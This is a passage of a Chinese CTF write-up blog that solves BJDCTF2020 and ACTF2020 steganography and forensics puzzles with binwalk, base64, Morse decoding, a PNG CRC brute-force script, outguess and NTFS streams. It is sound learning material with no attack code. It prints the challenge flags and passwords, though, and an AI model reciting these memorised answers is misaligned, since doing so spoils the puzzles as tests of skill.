plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ binwalk -e &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;BitcoinPay.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 400 x 400, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">28932         0x7104          RAR archive data, version 5.x</span><br><span class="line">29034         0x716A          RAR archive data, version 5.x</span><br><span class="line">94226         0x17012         RAR archive data, version 5.x</span><br></pre></td></tr></table></figure><p>其中一个文件–<code>YXNkZmdoamtsMTIzNDU2Nzg5MA==</code>解码<code>asdfghjkl1234567890</code>，另一个压缩包的密码，得到一个jpg。</p><p>flag.doc文件，一串很长的字符串，<code>Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVjBaS2RHVkdXbFpOYWtFeFZtcEJlRll5U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFjVkZ0UmxSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1pFWlNUbFpVVmtwV2JURXdWakZXZEZOc1dsaGlSa3BZV1ZkMGQyUnNjRmRYYlVaclVsUkdWbFpYZUZOVWJVWTJVbFJHVjJFeVVYZFdha1pYWkVaT2NscEdhR2xTTW1ob1YxZDBZVll3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOc2NFaGpSazVYVWpOb2IxWXhaRFJWTVVsNVZXNU9XR0pIVWxsWmJGWmhZMnhXY1ZGVVJsTk5WMUo1VmpJMWExWXdNVVZTYkdSYVRVWmFNMVpxU2t0V1ZrcFpXa1p3YkdFelFrbFdiWEJIVkRKU1YxWnVUbGhpVjJoeldXeG9iMkl4V25STldHUlZUV3RzTlZWdGRHdGhiRXAwVld4c1dtSkdXbWhaTW5oWFl6RldjbHBHWkdsU2JrSmFWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGaFhTRUpJVmtSS1UxWXhXblZVYkdocFZqTm9WVlpHWTNoaU1sSnpWMjVTVGxkSFVsWlVWM1J6VGxaV2RHUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVlp3YUZwRlpGTlRSa3B5VGxaT2FXRXdjRWxXYlhCTFRrWlJlRmRzYUZSaE1sSnhWVzB4TkdGR1ZYZGhSVTVUVW14d2VGVXlkR0ZpUmxwelUyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhYYmxaV1lsZG9WRmxZY0ZkbGJHUllaVWM1YVUxWFVraFdNalZUVkd4T1NHRkdRbFppVkVVd1ZtcEdVMVp0UmtoUFZtaFRUVWhDTlZaSGVHRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnNObEpzWkdwaVNFSklWMnRrYzFVeVNuSlRiVVpYVFc1b1dGbHFTa1psUm1SWldrVTFWMVpzY0ZWWFYzUnJWVEZzVjFWc1dsaGliVkp6V1d0YWQyVkdWblJOVldSVlRXdHdSMVl5ZUhkWGJGcFhZMGRvV21FeVVrZGFWM2hIWTIxS1IxcEdaRTVOUlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVmxsclpHOWpSbHB4VkcwNWEySkdjRWhXYlRBMVZXc3hXRlZ1Y0ZkTmFsWk1WakJrUzFOR1ZuUlNiR1JvWVRGd1NWWkhkR0ZaVm1SSVZXdG9hMUl5YUhCVmJHaENaREZhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZteHdNMVl3V25KbFJtUnlaRWR3YVZacmNFbFdiR1EwWVRKR1YxTnVVbEJXUlRWWVZGYzFiMWRHYkhGVGExcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsaVZrcDZWMWQwWVdReVZrZFdibEpPVmxkU1ZsUlhkSGRTTVZsNVpVaGtXR0pHY0ZoWk1HaExWakZhUmxkcmVGZE5WbkJJV1RJeFMxSXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWbGhvV0ZkSGFGbFpiWGhoVm14c2NscEhPV3BTYkhCNFZrY3dOVll4V25SVmJHaFhWak5OTVZaWGMzaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFdWWktjMVJ1VG1oU2JGcFlWRlJLYjFOV1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFZXczVXbFpGTlVSVWJGcGhVMGRXU0ZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVPVDJKRmNIcFhhMlIzWVZaT1JsTnJiRmhXYkZweVdYcEdWbVF3TVVsaFJrNW9Za2hDV1ZkV1pEQmtiVkY0VjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxkTlZuQjZXVEJhVjFkR1duTlRhMmhoVWtWYWNsVnFTa3RUVmxKMFlVWk9iR0pZYUZGV2ExcGhXVmRSZVZaclpGZGliRXBQVm14a1UxWXhVbGhrU0dSWFRWZDRlVlpYTVVkWFJrbDNWbXBTV2sxR1NsQldha3BIWTJ4a2NtVkdaR2hoTTBKUlZsUkNhMUl4U1hsU2EyaHBVbXMxY0ZsVVFuZE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR1ZHV2xwV1JWb3pXVlZhVjJOV1RuUlBWbVJUWWtWd1dsWkhlR3BPVmxsNFYyNU9hbEpYYUZsV2ExVXhaR3hzVjFaWWFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Um10V01WcDFVMnhDVjJKSVFuZFdiWFJYVm0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHNWbUZXYkZwMFpVaGtUazFXY0hsV01qRkhZV3hhY21ORVJsaGhNWEJRVmtkNFlXTnRUa1ZXYkdSVFRUSm9iMVpyVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaa1YxVnJaR3ROYTFwSVZqSjRWMVV5UlhoalNFNVdZbFJHVkZwWGVITldiR1J6Vkcxb1UxWkZXalpXVkVreFlURlplRmRZY0ZaaVYyaFhXbGQwWVZsV2NGWlhiR1JxVFd0YVIxUXhXbXRoUjFaelYycGFWMDFYVVhkWFZtUlNaVlphY2xwR1pHbGlSWEJRVm0xNGExVXhXWGhWYkdoclUwZFNXRlJXV25kTlJtdDNXa1ZrV0ZJd2NFaFpNRnB2VjJzeFNGVnVXbGROYm1ob1ZqQmFWMk5zY0VoU2JHUlhUVlZ3VWxac1pIZFRNVTE0VTFoc1UyRXlVbTlWYlhoTFZrWmFjMkZGVGxSTlZuQjRWVzB4UjFack1WWk5WRkpYVm0xb2VsWnNXbXRUUjBaSVlVWmFUbEp1UW05V2JURTBZekpPYzFwSVNtdFNNMEpVV1d0YWQwNUdXbGhOVkVKT1VteHNORll5TlU5aGJFcFlZVVpvVjJGck5WUldSVnB6VmxaR1dXRkdUbGRoTTBJMlZtdGtORmxXVlhsVGExcFlWMGhDV0Zac1duZFNNVkY0VjJ0T1ZtSkZTbFpVVlZGM1VGRTlQUT09</code>。</p><p>循环base64解密，拿到第二个<code>comEON_YOuAreSOSoS0great</code>，使用改密码解压一个文件夹拿到一个<code>good.MP3</code>。</p><p>对于good文件，先导出文件，然后使用工具，拿到莫斯密码。导出文件。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/46.png" alt="46"></p><p>使用工具解码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ morse2ascii /home/steady/桌面/steady/_BitcoinPay.png.extracted/<span class="number">55.</span>wav</span><br><span class="line">MORSE2ASCII <span class="number">0.2</span></span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open /home/steady/桌面/steady/_BitcoinPay.png.extracted/<span class="number">55.</span>wav</span><br><span class="line">  wave size      <span class="number">577010</span></span><br><span class="line">  format tag     <span class="number">1</span></span><br><span class="line">  channels:      <span class="number">1</span></span><br><span class="line">  samples/sec:   <span class="number">8000</span></span><br><span class="line">  avg/bytes/sec: <span class="number">16000</span></span><br><span class="line">  block align:   <span class="number">2</span></span><br><span class="line">  bits:          <span class="number">16</span></span><br><span class="line">  samples:       <span class="number">288505</span></span><br><span class="line">  bias adjust:   <span class="number">-162</span></span><br><span class="line">  volume peaks:  <span class="number">-23125</span> <span class="number">23125</span></span><br><span class="line">  normalize:     <span class="number">9642</span></span><br><span class="line">  resampling to  <span class="number">8000</span>hz</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">tt  ttt  ete  eee  e  ee  eee  eeet  e  ete  tett  eeet  e  ete  tett  e  et  eee  tett </span><br></pre></td></tr></table></figure><p><code>t</code>换<code>-</code>，<code>e</code>换<code>.</code>，转码得<code>morseisveryveryeasy</code>，即flag。</p><h3 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h3><p>根据题目名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;flag.zip</span><br><span class="line">&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;flag.zip: PNG image data, 245 x 256, 8-bit&#x2F;color RGBA, non-interlaced</span><br></pre></td></tr></table></figure><p>修改PNG后缀，一个二维码。扫描假flag。</p><p>使用<code>strings</code>查看到flag。</p><h3 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h3><p>CRC爆破修改高度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;1.png&#x27;</span>  <span class="comment">#注意，1.png图片要和脚本在同一个文件夹下哦~</span></span><br><span class="line">fr = open(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = bytearray(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = eval(str(fr[<span class="number">29</span>:<span class="number">33</span>]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">        height = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            print(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = bytearray(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = open(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure><p>使用binwalk分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# binwalk -e ezbb_r.png </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">28673         0x7001          End of Zip archive</span><br><span class="line"></span><br><span class="line">root@root:~&#x2F;桌面&#x2F;flag# dd if&#x3D;&#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ezbb_r.jpg&#39;  of&#x3D;flag.zip skip&#x3D;28673 bs&#x3D;1</span><br><span class="line">记录了22+0 的读入</span><br><span class="line">记录了22+0 的写出</span><br></pre></td></tr></table></figure><p>可以看到有压缩包，进而使用dd命令。但是分离出来的压缩包是错误的。</p><p>使用<code>strings</code>命令没有发现，直接拖入winhex查看原因，搜索FFD9或者504B，发现jpg结尾有一个504B，修改后面的值为zip压缩头，解压拿到一个文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                                                              </span><br><span class="line">                                                              </span><br><span class="line">##############    ##      ##    ##########  ##############    </span><br><span class="line">##          ##  ####  ####  ######  ##      ##          ##    </span><br><span class="line">##  ######  ##    ######      ##    ##      ##  ######  ##    </span><br><span class="line">##  ######  ##  ####  ##  ##      ##        ##  ######  ##    </span><br><span class="line">##  ######  ##      ##  ##      ##  ####    ##  ######  ##    </span><br><span class="line">##          ##  ##  ##        ####          ##          ##    </span><br><span class="line">##############  ##  ##  ##  ##  ##  ##  ##  ##############    </span><br><span class="line">                        ##    ##        ##                    </span><br><span class="line">##########  ##########  ####  ##  ##  ######  ##  ##  ##      </span><br><span class="line">##    ####    ##  ##      ##    ##  ######  ##############    </span><br><span class="line">####      ######  ##  ####  ####    ##    ##    ####  ##      </span><br><span class="line">######  ####    ########    ######        ##########  ##      </span><br><span class="line">####  ########    ##  ##  ##  ######              ######      </span><br><span class="line">####      ##  ########  ##  ##  ##  ####  ##########  ####    </span><br><span class="line">    ##########  ##        ##  ##        ####  ##    ####      </span><br><span class="line">##########    ####  ##  ##    ##    ######    ##  ##  ##      </span><br><span class="line">######    ####          ####  ##  ####            ####        </span><br><span class="line">########        ##        ####      ######  ##  ####  ####    </span><br><span class="line">##  ##  ########      ####    ##    ##                        </span><br><span class="line">##    ##      ##      ##      ####  ######  ####  ##    ##    </span><br><span class="line">##  ####    ####      ##        ######################  ##    </span><br><span class="line">                ####    ####    ######  ##      ##  ######    </span><br><span class="line">##############  ######    ######      ####  ##  ##            </span><br><span class="line">##          ##    ####  ####  ##      ####      ##            </span><br><span class="line">##  ######  ##  ####    ##  ####  ####  ##################    </span><br><span class="line">##  ######  ##  ##                        ##          ####    </span><br><span class="line">##  ######  ##  ##########    ##          ####  ####  ##      </span><br><span class="line">##          ##  ########    ##  ##    ####  ##  ##    ##      </span><br><span class="line">##############  ########      ##########  ####  ##  ##        </span><br><span class="line">                                                              </span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure><p>像一个二维码，放入notepad++，把空格替换为0，把#替换为1。使用脚本进行转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">length = <span class="number">58</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (length*<span class="number">5</span>, length*<span class="number">5</span>))</span><br><span class="line"><span class="comment">#黑点为1白点为0</span></span><br><span class="line">data = <span class="string">&quotquot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(length):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(length):</span><br><span class="line">        <span class="keyword">if</span> data[x*length+y] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> xx <span class="keyword">in</span> range(x*<span class="number">5</span>, x*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">for</span> yy <span class="keyword">in</span> range(y*<span class="number">5</span>, y*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                    img.putpixel([xx, yy], (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> xx <span class="keyword">in</span> range(x*<span class="number">5</span>, x*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">for</span> yy <span class="keyword">in</span> range(y*<span class="number">5</span>, y*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                    img.putpixel([xx, yy], (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>扫描之后拿到<code>od -vtx1 ./draw.png | head -56 | tail -28</code>。</p><p>放入kali执行。od是一个linux命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0000700 01 00 02 10 03 10 00 00 01 ee c0 b8 a6 00 00 00</span><br><span class="line">0000720 ff ff ff 00 ff ff ff ff 00 ff ff 00 00 00 ff ff</span><br><span class="line">0000740 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0000760 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001000 ff ff 00 00 00 00 ff 00 00 ff 00 ff 00 ff 00 00</span><br><span class="line">0001020 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001040 ff 00 ff 00 ff 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001060 ff ff ff 00 ff ff ff 00 00 ff ff 00 00 00 ff ff</span><br><span class="line">0001100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001120 ff ff ff 00 ff ff ff 00 ff ff ff 00 ff ff 00 00</span><br><span class="line">0001140 ff 00 00 00 00 00 ff 00 00 00 ff 00 00 ff 00 00</span><br><span class="line">0001160 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 ff 00 00</span><br><span class="line">0001200 00 00 ff 00 00 00 ff 00 ff 00 00 00 00 ff 00 00</span><br><span class="line">0001220 ff ff ff 00 00 00 ff 00 ff ff ff 00 ff ff ff 00</span><br><span class="line">0001240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001260 ff ff ff 00 ff 00 ff 00 ff ff ff 00 ff ff ff 00</span><br><span class="line">0001300 ff 00 00 00 ff 00 ff 00 ff 00 ff 00 00 00 ff 00</span><br><span class="line">0001320 ff ff ff 00 ff ff ff 00 ff ff ff 00 00 00 ff 00</span><br><span class="line">0001340 00 00 ff 00 00 00 ff 00 00 00 ff 00 00 00 ff 00</span><br><span class="line">0001360 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 00 ff 00</span><br><span class="line">0001400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001420 ff ff ff 00 ff ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001440 ff 00 00 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001460 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001500 ff 00 ff 00 00 ff ff 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001520 ff 00 ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001540 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001560 00 00 00 00 ff ff 00 63 da e9 3c 36 b1 aa 93 59</span><br></pre></td></tr></table></figure><p>把 ff 高亮一下显示发现并不是二维码，直接显示的是 flag 的图像了，结果是 BJD{572154976}。</p><h3 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h3><p>两个gif文件，一个损坏。</p><p>先对正常的进行分帧，没有发现异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert flag.gif flag.png</span><br></pre></td></tr></table></figure><p>查看损坏的gif，使用<code>file</code>命令查看文件类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;篮球副本.gif&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;篮球副本.gif: data</span><br></pre></td></tr></table></figure><p>放入winhex，发现少头，补充头部<code>47 49 46 38</code>。</p><h3 id="ACTF新生赛2020-outguess"><a href="#ACTF新生赛2020-outguess" class="headerlink" title="[ACTF新生赛2020]outguess"></a>[ACTF新生赛2020]outguess</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# exif &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg&#39; </span><br><span class="line">‘&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg’中的EXIF 信息标识(‘摩托罗拉’字节顺序):</span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">信息标识                |值</span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">XP Comment          |公正民主公正文明公正和谐</span><br><span class="line">Padding             |2060 bytes undefined data</span><br><span class="line">X-Resolution        |72</span><br><span class="line">Y-Resolution        |72</span><br><span class="line">Resolution Unit     |英寸</span><br><span class="line">Padding             |2060 bytes undefined data</span><br><span class="line">Exif Version        |Exif版本2.1</span><br><span class="line">FlashPixVersion     |FlashPix版本 1.0</span><br><span class="line">色彩空间                |Internal error (unknown value 65535)</span><br><span class="line">--------------------+----------------------------------------------------------</span><br></pre></td></tr></table></figure><p>社会注意核心价值观，解码为abc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# outguess -k abc -r &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg&#39; out.txt</span><br><span class="line">Reading &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg....</span><br><span class="line">Extracting usable bits:   17550 bits</span><br><span class="line">Steg retrieve: seed: 93, len: 23</span><br><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# cat out.txt </span><br><span class="line">ACTF&#123;gue33_Gu3Ss!2020&#125;</span><br></pre></td></tr></table></figure><p>直接<code>stings</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;attachment.exe&#39; </span><br><span class="line">; ;$;(;,;0;4;8;&lt;;@;D;H;L;T;X;\;&#96;;d;</span><br><span class="line">Rar!</span><br><span class="line">CMT;</span><br><span class="line">Silent&#x3D;1</span><br><span class="line">1.txt</span><br><span class="line">ntfs      </span><br><span class="line">flag.txt</span><br><span class="line">:flag.txt</span><br><span class="line">G3JV&quot;</span><br></pre></td></tr></table></figure><p>发现很多信息，ntf、rar、flag.txt。使用binwalk，都没有什么发现，最后直接运行exe，生成一个txt，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntfs      </span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure><p>尝试ntfs隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop\CTF&gt;notepad 1.txt:flag.txt</span><br></pre></td></tr></table></figure><p>直接拿到flag。</p><h3 id="谁赢了比赛？"><a href="#谁赢了比赛？" 